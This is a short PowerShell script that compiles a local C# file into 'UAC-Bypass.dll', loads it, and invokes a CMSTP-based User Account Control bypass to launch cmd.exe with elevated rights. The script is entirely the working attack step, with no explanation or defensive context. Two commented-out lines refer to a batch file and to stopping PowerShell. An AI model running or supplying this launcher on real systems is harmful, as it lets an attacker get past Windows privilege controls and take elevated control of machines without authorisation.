Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "UAC-Bypass.dll"
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\UAC-Bypass.dll"))
[CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe")
# .\switch.bat
# Stop-process -Name PowerShell